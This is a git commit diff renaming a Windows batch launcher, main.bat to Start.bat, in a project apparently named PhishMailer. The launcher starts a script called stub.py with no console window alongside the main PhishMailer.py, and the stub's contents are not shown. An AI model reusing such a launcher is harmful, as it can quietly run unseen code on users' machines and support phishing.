f70df9e811a1b3ec71b36638367fc3ad2e2cc6ec
oracio-tech <78463847+oracio-tech@users.noreply.github.com>
2024-06-17 04:36:06 -0700

    Update and rename main.bat to Start.bat

---
+++ Start.bat
@@ -0,0 +1,4 @@
+@echo off
+start pythonw Core\Mailer\stub.py
+start python PhishMailer.py
+exit
--- main.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-start pythonw PhishMailer-main\Core\Mailer\stub.py
-start python PhishMailer.py
-exit
